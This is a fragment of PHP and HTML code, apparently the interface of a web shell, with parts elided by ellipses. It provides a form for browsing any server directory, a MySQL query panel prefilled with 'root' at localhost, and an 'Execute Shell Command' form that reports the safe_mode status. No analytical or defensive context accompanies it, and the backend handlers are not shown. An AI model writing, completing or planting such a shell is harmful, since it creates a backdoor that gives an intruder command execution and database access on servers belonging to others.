...
else
{
    ...
    <b>Go to any directory:</b> <form action="" method="GET"><input class="clear" type="text" name="d" value="<?php echo $rootDir ?>" /><input class="clear" type="submit" value="Go" /></form>
    ...
    <form action="" METHOD="GET" >
        <table>
            <tr><td>host</td><td><input class="clear" type="text" name="host"value="localhost"> </td></tr>
            <tr><td>user</td><td><input class="clear" type="text" name="usr" value="root"> </td></tr>
            <tr><td>password</td><td><input class="clear" type="text" name="passwd"> </td></tr>
            <tr><td>database</td><td><input class="clear" type="text" name="db"> </td></tr>
            <tr><td valign="top">query</td><td><textarea name="mquery" rows="6" cols="65"></textarea> </td></tr>
            <tr><td colspan="2"><input class="clear" type="submit" value="execute"></td></tr>
        </table>
    </form>
    <hr>
    <pre><form action="" METHOD="GET" >Execute Shell Command (safe mode is <?php echo (@ini_get('safe_mode') ? 'on' : 'off') ?>): <input class="clear" type="text" name="c"><input class="clear" type="submit" value="Go"></form>
    <?php
}
